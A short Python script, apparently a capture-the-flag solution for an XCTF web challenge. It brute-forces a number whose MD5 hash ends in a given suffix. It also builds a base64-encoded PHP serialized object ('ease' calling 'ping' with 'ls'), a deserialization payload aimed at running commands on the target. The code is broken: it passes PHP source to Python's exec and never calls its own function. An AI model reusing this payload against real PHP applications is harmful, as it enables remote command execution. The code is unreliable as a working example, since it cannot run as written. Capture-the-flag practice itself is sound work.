import  random
import  hashlib
import sys
def xctf():
    value="8b184b"
    while 1:
        plain=random.randint(10**11,10**12-1)
        plain=str(plain)
        Md5=hashlib.md5()
        Md5.update(plain.encode(encoding="utf-8")) #编码后是字节
        cipher=Md5.hexdigest()
        if  cipher[-6:]==value:
            print("cipher",cipher)
            print('plain',plain)
            break   
php_code='''
class ease{
private $method;
private $args;
function __construct($method, $args) {
    $this->method = $method;
    $this->args = $args;
} 
}
$a = new ease("ping",array('ls'));
$b = serialize($a);
echo $b;
echo'</br>';
echo base64_encode($b);
'''
exec(php_code)